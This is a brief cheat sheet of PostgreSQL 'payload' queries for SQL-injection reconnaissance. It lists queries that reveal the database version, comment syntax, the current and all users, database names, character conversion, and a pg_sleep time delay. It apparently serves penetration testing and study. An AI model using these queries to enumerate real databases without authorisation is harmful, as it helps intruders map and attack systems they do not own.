PostgresSQL Payload
=====================================

- Version 
    - ``SELECT version()``
- Comment 
    - ``SELECT 1 -- comment``
    - ``SELECT /*comment*/1``
- Current User
    - ``SELECT user``
    - ``SELECT current_user``
    - ``SELECT session_user``
    - ``SELECT getpgusername()``
- List User
    - ``SELECT usename FROM pg_user``
- Current Database
    - ``SELECT current_database()``
- List Database
    - ``SELECT datname FROM pg_database``
- Ascii
    - ``SELECT char(0x41)``
    - ``SELECT ascii('A')``
- Delay
    - ``pg_sleep(1)``
